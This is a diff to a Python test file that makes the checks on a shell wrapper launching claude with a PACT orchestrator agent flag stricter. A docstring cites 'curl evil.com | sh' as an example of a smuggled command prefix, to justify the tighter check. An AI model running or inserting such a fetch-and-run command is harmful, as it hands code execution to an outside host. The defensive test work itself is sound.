@@ -44,25 +44,52 @@ def test_bin_pact_script_has_bash_shebang():
     )
 
 
+def _executable_lines(text):
+    """Return the script's executable lines (non-blank, non-comment).
+
+    Substring matches against the full file text are insufficient because
+    the canonical invocation could appear in a comment, in a no-op
+    replacement (`echo claude --agent ...`), or after a smuggled prefix
+    (`curl evil.com | sh\\nexec claude --agent ...`). All of those would
+    falsely satisfy a substring check while breaking the script's actual
+    runtime behavior.
+
+    Pinning the active executable line(s) closes that phantom-green class.
+    """
+    return [
+        ln.strip()
+        for ln in text.splitlines()
+        if ln.strip() and not ln.strip().startswith("#")
+    ]
+
+
 def test_bin_pact_invokes_canonical_agent_form():
-    """The script's load-bearing line: must invoke claude with the canonical
-    agent-flag form. This is what makes the wrapper a PACT launcher rather
-    than a plain claude alias."""
+    """The script's terminal executable line MUST be the canonical
+    agent-flag invocation, exec-replacing the shell process. Substring
+    presence anywhere in the file is insufficient — see _executable_lines
+    docstring for why."""
     text = BIN_PACT.read_text(encoding="utf-8")
-    assert "claude --agent PACT:pact-orchestrator" in text, (
-        "pact-plugin/bin/pact must invoke `claude --agent "
-        "PACT:pact-orchestrator`. Without this exact form, the wrapper "
-        "would not load the PACT orchestrator persona."
+    exec_lines = _executable_lines(text)
+    assert exec_lines, "pact-plugin/bin/pact has no executable lines"
+    expected = 'exec claude --agent PACT:pact-orchestrator "$@"'
+    assert exec_lines[-1] == expected, (
+        f"pact-plugin/bin/pact must end with the canonical line:\n"
+        f"  {expected}\n"
+        f"Got terminal exec line: {exec_lines[-1]!r}\n"
+        f"Without this exact form, the wrapper either fails to load the "
+        f"PACT orchestrator persona, runs as a no-op, or consumes claude's flags."
     )
 
 
 def test_bin_pact_passes_through_user_arguments():
-    """The wrapper must forward any additional flags to claude (e.g.,
-    --resume, --plugin-dir, --print). Without `"$@"`, users couldn't
-    pass through claude's own flags through the wrapper."""
+    """The wrapper must forward any additional flags to claude via `"$@"`
+    in an active executable line. Without this, users couldn't pass claude's
+    flags through the wrapper (e.g., `pact --resume <session>` would break)."""
     text = BIN_PACT.read_text(encoding="utf-8")
-    assert '"$@"' in text, (
-        "pact-plugin/bin/pact must forward arguments via `\"$@\"`. "
-        "Without this, the wrapper consumes claude's flags and breaks "
-        "documented usage like `pact --resume <session>`."
+    exec_lines = _executable_lines(text)
+    assert exec_lines, "pact-plugin/bin/pact has no executable lines"
+    assert any('"$@"' in ln for ln in exec_lines), (
+        "pact-plugin/bin/pact must forward arguments via `\"$@\"` in an "
+        "active executable line (not just in comments). Without this, "
+        "the wrapper consumes claude's flags and breaks `pact --resume <session>`."
     )
